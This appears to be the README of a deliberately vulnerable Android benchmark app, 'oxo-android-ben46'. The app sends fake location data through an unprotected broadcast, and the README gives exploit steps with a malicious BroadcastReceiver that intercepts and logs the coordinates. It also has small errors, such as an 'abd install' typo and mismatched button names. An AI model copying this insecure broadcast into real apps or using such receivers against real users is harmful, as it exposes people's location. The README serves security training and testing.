# oxo-android-ben46 Broadcast of Sensitive Information

### Description

his project demonstrates a critical security vulnerability in an Android application where location data is broadcast without proper protection.

The app simulates a simple position sharing flow. When the user clicks the "Share Position" button:

A fake location (latitude/longitude) is generated (randomized to mimic realistic coordinates).

This location is then broadcast using context.sendBroadcast() with the action com.example.location.

Since the broadcast is unprotected, any other app on the device can intercept the shared position.

After sharing the position, the button changes to "Go to Dashboard", which redirects the user to a webpage. This masks the vulnerability, as the user only sees expected app behavior.

The vulnerability is located in the MainActivity.kt file.

**Relevant Code (MainActivity.kt):**
```kotlin
val latitude = Random.nextDouble(-90.0, 90.0)
val longitude = Random.nextDouble(-180.0, 180.0)

// Broadcast location (insecure behavior)
val locationIntent = Intent("com.example.location").apply {
    putExtra("LAT", latitude)
    putExtra("LON", longitude)
}
context.sendBroadcast(locationIntent)
```

### Vulnerability Type and Category
-   **Type:** Unprotected broadcast of sensitive information
-   **Category:** Unprotected broadcast of sensitive information

### Difficulty
Easy

## Build and Test Instructions

### Build

This project uses Android Studio with Kotlin. To build the debug APK from the terminal:
```bash
# Navigate into the source code directory first
cd src/
./gradlew build
```
The APK will be located at app/build/outputs/apk/release/app-release-unsigned.apk.

### How to Exploit

1. **Install the Vulnerable App**: Install the `oxo-android-ben46.apk` onto an Android device or emulator.

```
adb install oxo-android-ben46.apk 
```

2. **Set Up the Malicious App**: Create a second, malicious app with a `BroadcastReceiver` that includes an intent filter for the vulnerable broadcast action (`com.example.location`).

In `AndroidManifest.xml`:
```
<receiver android:name=".LocationReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.example.location" />
    </intent-filter>
</receiver>
```

In the `LocationReceiver.kt`:

```
override fun onReceive(context: Context?, intent: Intent?) {
    if (intent?.action == "com.example.location") {
        val lat = intent.getDoubleExtra("LAT", 0.0)
        val lon = intent.getDoubleExtra("LON", 0.0)
        Log.d("VulnerableBroadcast", "Intercepted location: ($lat, $lon)")
    }
}
```

3 **Install the Malicious App**: Install the malicious app on the same device.

```
abd install malicious-app.apk
```

4. **Trigger the Vulnerability**: Open the vulnerable app and click the "Open example.com" button.

5. **View the Exploit**: Use `adb logcat` to filter the logs for the malicious app's tag. You will see the intercepted location in the logs, confirming that the malicious app successfully captured the sensitive information from the broadcast.

```
adb logcat -s VulnerableBroadcast
```